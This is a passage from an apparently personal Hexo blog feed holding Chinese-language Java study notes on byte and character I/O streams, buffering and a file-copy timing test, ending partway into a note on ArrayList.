id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h4><ul><li>InputStream–&gt;FileInputStream</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testFileInputStream</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        FileInputStream input = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            input = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;Test/test1.txt&quot;</span>);</span><br><span class="line">            <span class="comment">//有一个指针，会自动改变指向</span></span><br><span class="line">            <span class="comment">//1.一字节的读取</span></span><br><span class="line"><span class="comment">//            while (true) &#123;</span></span><br><span class="line"><span class="comment">//                int a = input.read();</span></span><br><span class="line"><span class="comment">//                if(a == -1)break;</span></span><br><span class="line"><span class="comment">//                System.out.print((char) a);</span></span><br><span class="line"><span class="comment">//            //注意，因为是字节流，所以读取中文会乱码，中文占两字节</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line">            <span class="comment">//2.字节数组的读取</span></span><br><span class="line">            <span class="keyword">byte</span>[] data = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> length = input.read(data);</span><br><span class="line">                <span class="keyword">if</span>(length==-<span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">//输出方法一</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;length; i++) &#123;</span><br><span class="line">                    System.out.print((<span class="keyword">char</span>)data[i]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//输出方法2</span></span><br><span class="line">                String str = <span class="keyword">new</span> String(data,<span class="number">0</span>,length);</span><br><span class="line">                <span class="comment">//表示从data里的0开始取数据，长度为length</span></span><br><span class="line">                System.out.print(str);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (input != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    input.close();<span class="comment">// 释放资源</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><ul><li>OutputSteam–&gt;FileOutputStream</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testFileOutputStream</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        FileOutputStream output = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//true表示追加模式</span></span><br><span class="line">            output = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;Test/test1.txt&quot;</span>,<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//            output.write(97);</span></span><br><span class="line">            String str = <span class="keyword">new</span> String(<span class="string">&quot;abcd&quot;</span>);</span><br><span class="line">            output.write(str.getBytes());</span><br><span class="line">            <span class="comment">//截取字串添加</span></span><br><span class="line">            output.write(str.getBytes(), <span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(output != <span class="keyword">null</span>)</span><br><span class="line">                    output.close();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>文件文本的复制练习</p><ul><li>我使用了字节数组完成</li><li>后面有对比单字节和字节数组效率的数据</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu.iostream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IOCopy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">copyFile</span><span class="params">(String source,String target)</span> </span>&#123;</span><br><span class="line">        FileInputStream input = <span class="keyword">null</span>;</span><br><span class="line">        FileOutputStream output = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//input</span></span><br><span class="line">            input = <span class="keyword">new</span> FileInputStream(source);</span><br><span class="line">            output = <span class="keyword">new</span> FileOutputStream(target);</span><br><span class="line">            <span class="keyword">byte</span>[] data  = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span> length=-<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>((length=input.read(data))&gt;-<span class="number">1</span>) &#123;</span><br><span class="line">                String str = <span class="keyword">new</span> String(data,<span class="number">0</span>,length);</span><br><span class="line"><span class="comment">//                System.out.println(&quot;读取成功&quot;);</span></span><br><span class="line">                <span class="comment">//output</span></span><br><span class="line">                output.write(str.getBytes());</span><br><span class="line"><span class="comment">//                System.out.println(&quot;写入成功&quot;);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(input!=<span class="keyword">null</span>)</span><br><span class="line">                   input.close();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(output!=<span class="keyword">null</span>)</span><br><span class="line">                    output.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span>(IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>对比复制104.5M的压缩包</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testCopy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> start = System.currentTimeMillis(); </span><br><span class="line">        copyFileByArray(<span class="string">&quot;Test/test.zip&quot;</span>,<span class="string">&quot;Test/test2.zip&quot;</span>);</span><br><span class="line">        <span class="keyword">long</span> end = System.currentTimeMillis();</span><br><span class="line">        System.out.println(end-start);</span><br><span class="line">        start = System.currentTimeMillis(); </span><br><span class="line">        copyFileByByte(<span class="string">&quot;Test/test.zip&quot;</span>,<span class="string">&quot;Test/test3.zip&quot;</span>);</span><br><span class="line">        end = System.currentTimeMillis();</span><br><span class="line">        System.out.println(end-start);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>结果（单位毫秒）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1024字节：5515</span><br><span class="line">单字节：493533</span><br></pre></td></tr></table></figure><h4 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h4><p>作用：节约性能，当缓冲区满时就会与硬盘交互</p><h4 id="缓冲输出流（包装流）"><a href="#缓冲输出流（包装流）" class="headerlink" title="缓冲输出流（包装流）"></a>缓冲输出流（包装流）</h4><p>缓冲区的数据只有在下面三种情况才会写入硬盘，之所以说是包装流是因为它依赖于File</p><ol><li>满了</li><li>调用flush刷新缓冲区</li><li>调用close</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu5.buffer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBufferedOutputStream</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testBufferedOutputStream</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        BufferedOutputStream bos = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            bos = <span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;Test/test1.txt&quot;</span>),<span class="number">1</span>);</span><br><span class="line">            <span class="comment">//后面代表自定义缓冲区大小，一般使用默认就好了</span></span><br><span class="line">            bos.write(<span class="number">97</span>);</span><br><span class="line">            String str = <span class="keyword">new</span> String(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">            bos.write(str.getBytes());</span><br><span class="line">            bos.flush();</span><br><span class="line">            <span class="comment">//建议调用flush，怕close出错</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(bos!=<span class="keyword">null</span>)</span><br><span class="line">                    bos.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="缓冲输入流"><a href="#缓冲输入流" class="headerlink" title="缓冲输入流"></a>缓冲输入流</h4><p>缓冲区的作用</p><ul><li>读满缓冲区，然后你需要多少给你多少</li><li>节约性能</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BufferedIOStream</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testBufferedInputStream</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        BufferedInputStream bis = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            bis = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;Test/test1.txt&quot;</span>));</span><br><span class="line"><span class="comment">//            int data = bis.read();</span></span><br><span class="line"><span class="comment">//            System.out.println(data);</span></span><br><span class="line">            <span class="keyword">byte</span>[] data = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span> length = bis.read(data);</span><br><span class="line">            String str = <span class="keyword">new</span> String(data,<span class="number">0</span>,length);</span><br><span class="line">            System.out.println(str); </span><br><span class="line">        &#125;  <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="字符流"><a href="#字符流" class="headerlink" title="字符流"></a>字符流</h3><ul><li>操作一个Unicode码元（2字节）</li><li>默认是有缓冲区的，但不能设置大小</li></ul><h4 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h4><ul><li>Writer–&gt;OutputStreamWriter（包装流）</li><li>构造OutputStreamWriter对象时，可以指定编码，默认系统编码</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu.iostream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStreamWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IO_WriterRead</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testOutputStreamWriter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        OutputStreamWriter writer = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fileOutput = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;Test/test1.txt&quot;</span>);</span><br><span class="line">            writer = <span class="keyword">new</span> OutputStreamWriter(fileOutput);</span><br><span class="line">            <span class="comment">//可以传递两个参数，另一个是编码</span></span><br><span class="line">            writer.write(<span class="string">&quot;你好&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123; </span><br><span class="line">            <span class="keyword">try</span> &#123; </span><br><span class="line">                <span class="keyword">if</span>(writer!=<span class="keyword">null</span>); </span><br><span class="line">                writer.close(); </span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h4><ul><li>Reader–&gt;InputStreamWriter（包装流）</li><li>构造InputStreamWriter对象时，可以指定编码，默认系统编码</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testInputStreamReader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    InputStreamReader reader = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        reader = <span class="keyword">new</span> InputStreamReader(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;Test/test1.txt&quot;</span>),<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">char</span>[] data = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> length = reader.read(data); </span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(data,<span class="number">0</span>,length));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(reader!=<span class="keyword">null</span>)</span><br><span class="line">                reader.close(); </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="FileWriter"><a href="#FileWriter" class="headerlink" title="FileWriter"></a>FileWriter</h4><ul><li>Writer–&gt;OutputStreamWriter–&gt;FileWriter</li><li>相对与<code>OutputStreamWriter</code>，<code>FileWriter</code>构造时时不需要<code>new FileOutputStream</code>，因为它在调用父类构造方法时自动<code>new FileOutputStream()</code></li></ul><p>例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testFileWriter</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    FileWriter writer = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        writer = <span class="keyword">new</span> FileWriter(<span class="string">&quot;Test/test1.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        writer.write(<span class="string">&quot;hello,我是manu!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(writer!=<span class="keyword">null</span>)</span><br><span class="line">                writer.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="FileReader"><a href="#FileReader" class="headerlink" title="FileReader"></a>FileReader</h4><ul><li>Reader–&gt;InputStreamReader–&gt;FileReader</li><li>构造简单</li></ul><p>例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testFileReader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FileReader reader = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        reader = <span class="keyword">new</span> FileReader(<span class="string">&quot;Test/test1.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">char</span>[] data = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> length = reader.read(data);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(data,<span class="number">0</span>,length));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(reader!=<span class="keyword">null</span>)</span><br><span class="line">                reader.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果要设定编码，则需要在构造时给出Charset型的数据即可</li></ul><p>如</p><p><code>reader = new FileReader(&quot;Test/test1.txt&quot;,Charset.forName(&quot;GBK&quot;));</code></p><h4 id="BufferedWriter"><a href="#BufferedWriter" class="headerlink" title="BufferedWriter"></a>BufferedWriter</h4><ul><li><p>Writer–&gt;BufferedWriter</p></li><li><p>可以设置缓冲区大小</p></li><li><p>有一个<code>readLine()</code></p></li></ul><h4 id="BufferedReader"><a href="#BufferedReader" class="headerlink" title="BufferedReader"></a>BufferedReader</h4><ul><li><p>Reader–&gt;BufferedReader</p></li><li><p>可以设置缓冲区大小</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>集合类</title>
      <link href="/Programming/Java/day10_%E9%9B%86%E5%90%88%E7%B1%BB.html"/>
      <url>/Programming/Java/day10_%E9%9B%86%E5%90%88%E7%B1%BB.html</url>
      
        <content type="html"><![CDATA[<p> 别问是什么，问就是不懂</p><span id="more"></span><h2 id="ArrayList集合"><a href="#ArrayList集合" class="headerlink" title="ArrayList集合"></a>ArrayList集合</h2><p>相当于一个可变的数组，这个数组可以存放任何数据类型（但是建议存储相同类型的）</p><ul><li>集合里面只能存储引用类型</li><li>他会自动把基本类型装箱</li></ul><p>举个例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu1.arraylist;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayListDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ArrayList al1 = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        </span><br><span class="line">        al1.add(<span class="number">123</span>);</span><br><span class="line">        al1.add(<span class="number">2</span>);</span><br><span class="line">        al1.add(<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line"><span class="comment">//        al1.add(&quot;test&quot;); </span></span><br><span class="line">        al1.addAll(<span class="number">0</span>,al1);</span><br><span class="line">        System.out.println(al1.get(<span class="number">1</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;al1.size(); i++) &#123;</span><br><span class="line">            System.out.print(al1.get(i)+<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">        </span><br><span class="line">        al1.remove(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;al1.size(); i++) &#123;</span><br><span class="line">            System.out.print(al1.get(i)+<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="comment">//进行运算</span></span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> 